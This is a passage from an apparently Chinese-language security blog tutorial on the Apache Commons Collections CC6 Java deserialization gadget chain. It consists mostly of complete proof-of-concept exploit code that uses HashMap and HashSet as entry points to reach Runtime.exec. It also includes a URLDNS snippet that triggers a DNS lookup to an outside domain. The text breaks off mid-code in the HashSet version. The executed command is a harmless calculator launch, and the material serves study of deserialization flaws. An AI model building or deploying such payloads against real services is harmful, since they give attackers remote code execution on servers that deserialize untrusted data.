class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;k&quot;</span>);</span><br><span class="line"></span><br><span class="line">        tme.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-cc6/0.png"></p><h2 id="0x04-HashMap"><a href="#0x04-HashMap" class="headerlink" title="0x04 HashMap"></a>0x04 HashMap</h2><p><code>java.util.HashMap</code>类在之前的URLDNS链中就已用到过，这里将其及其相关方法再一次贴出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMap</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">AbstractMap</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要你稍微回忆下URLDNS链，一种似曾相识的感觉或许就会涌现你心头。其实不光是<code>HashMap</code>类，上面<code>TiedMapEntry#hashCode</code>方法的出现，也应该能够联系到URLDNS链，URLDNS链中的Sink就是调用的<code>hashCode</code>方法。</p><p>这里，也将URLDNS完整调用链和POC再次贴出来，若对URLDNS链不熟悉，请先回头看<a href="./java-deserialization-vulnerability-principle#0x03-URLDNS%E9%93%BE%E5%88%86%E6%9E%90">《Java反序列化漏洞#0x03 URLDNS链分析》</a>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">HashMap.readObject()</span></span><br><span class="line"><span class="comment">    HashMap.putVal()</span></span><br><span class="line"><span class="comment">        HashMap.hash()</span></span><br><span class="line"><span class="comment">            URL.hashCode()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://urldns.1asj4bef1af.ipv6.bypass.eu.org&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 修改hashCode的值为非-1，以防止在序列化时触发DNS查询，造成误报</span></span><br><span class="line">        f.set(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(url, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将hashCode改回-1，以在反序列化时触发DNS查询</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;urldns.ser&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此前的URLDNS链中，我们首先对<code>url</code>对象的成员变量<code>hashCode</code>修改成了非-1，以防在序列化时触发DNS查询，造成误报，然后再调用<code>put</code>方法，最后才会将<code>hashCode</code>改回-1，以在反序列化时触发DNS查询。</p><p>同理，在CC链中也需要这样的操作，由于此处涉及的是<code>Transformer</code>对象，那我们就可以先传入一个空<code>ChainedTransformer</code>至<code>lazyMap</code>，然后创建<code>TiedMapEntry</code>对象并传入这个<code>lazyMap</code>和一个key，再创建<code>HashMap</code>对象并调用<code>put</code>新增<code>TiedMapEntry</code>对象和一个value，最后利用反射将真正恶意的Transformer数组传入<code>ChainedTransformer</code>中。</p><p>最后的最后，还需对传入<code>lazyMap</code>中的键进行移除，以通过<code>LazyMap#get</code>方法中的if判断。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// 如果key当前不在map中，则为key创建value</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，在反序列化时便能够顺利地触发到<code>LazyMap#get</code>方法，并触发其中的<code>transform</code>方法调用。</p><p>综上，最终构造如下POC。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Gadget Chain: </span></span><br><span class="line"><span class="comment">HashMap.readObject()</span></span><br><span class="line"><span class="comment">    HashMap.put()</span></span><br><span class="line"><span class="comment">    HashMap.hash()</span></span><br><span class="line"><span class="comment">        TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">        TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">            LazyMap.get()</span></span><br><span class="line"><span class="comment">                ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                    ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                    InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                        Method.invoke()</span></span><br><span class="line"><span class="comment">                            Class.getMethod()</span></span><br><span class="line"><span class="comment">                    InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                        Method.invoke()</span></span><br><span class="line"><span class="comment">                            Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                    InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                        Method.invoke()</span></span><br><span class="line"><span class="comment">                            Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6WithHashMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] evilTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个空ChainedTransformer</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">emptyTransformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将如上创建的空ChainedTransformer传入新创建的lazyMap中</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), emptyTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建TiedMapEntry对象，将lazyMap传入其中</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;k&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashMap对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(entry, <span class="string">&quot;v&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 利用反射技术，传入真正恶意的evilTransformers</span></span><br><span class="line">        f.set(emptyTransformers, evilTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 移除传入lazyMap中的Key，使LazyMap#get方法中的(map.containsKey(key) == false)判断为true</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;k&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ----------------本地序列化与反序列化测试----------------</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC6WithHashMap.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(hashMap);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;CC6WithHashMap.ser&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-cc6/1.png"></p><h2 id="0x05-HashSet"><a href="#0x05-HashSet" class="headerlink" title="0x05 HashSet"></a>0x05 HashSet</h2><p>在CC6链中，除了<code>java.util.HashMap</code>类可作为Kick-off外，<code>java.util.HashSet</code>类也同样可以，只是稍显繁琐，Ysoserial工具中的CC6链用到的就是这种方式。</p><p><code>HashSet</code>是Java标准库中的一个类，具有快速添加、删除和查找等操作功能，并且实现了<code>Set</code>和<code>Serializable</code>等接口。<code>HashSet</code>内部实际上是通过一个<code>HashMap</code>实例来存储元素的，<code>HashSet</code>中的元素被存储为<code>HashMap</code>中的键，而对应的值则是一个固定的<code>Object</code>对象。在<code>HashSet</code>中，元素相当于是<code>HashMap</code>的键，而值则是一个占位符对象（即<code>PRESENT</code>常量），所以实际上<code>HashSet</code>只是一个对<code>HashMap</code>的包装，它通过键的唯一性来保证集合中不包含重复元素。</p><p>在<code>HashSet</code>中重写的<code>readObject</code>方法中，有对<code>HashMap</code>中的<code>put</code>方法进行调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashSet</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">AbstractSet</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">Set</span>&lt;E&gt;, Cloneable, java.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">5024744406713321676L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> HashMap&lt;E,Object&gt; map;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Dummy value to associate with an Object in the backing Map</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">PRESENT</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以以<code>HashSet</code>作为Kick-off，构造完整链的方式相比直接用<code>HashMap</code>，没有发生多大的变化，无非再多套一层<code>HashSet</code>，那么据此直接构造如下POC了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Gadget Chain:</span></span><br><span class="line"><span class="comment">HashSet.readObject()</span></span><br><span class="line"><span class="comment">    HashMap.put()</span></span><br><span class="line"><span class="comment">    HashMap.hash()</span></span><br><span class="line"><span class="comment">        TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">        TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">            LazyMap.get()</span></span><br><span class="line"><span class="comment">                ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                    ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                    InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                        Method.invoke()</span></span><br><span class="line"><span class="comment">                            Class.getMethod()</span></span><br><span class="line"><span class="comment">                    InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                        Method.invoke()</span></span><br><span class="line"><span class="comment">                            Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                    InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                        Method.invoke()</span></span><br><span class="line"><span class="comment">                            Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6WithHashSet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] evilTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个空ChainedTransformer</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">emptyTransformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将如上创建的空ChainedTransformer传入新创建的lazyMap中</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), emptyTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建TiedMapEntry对象，将lazyMap传入其中</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span 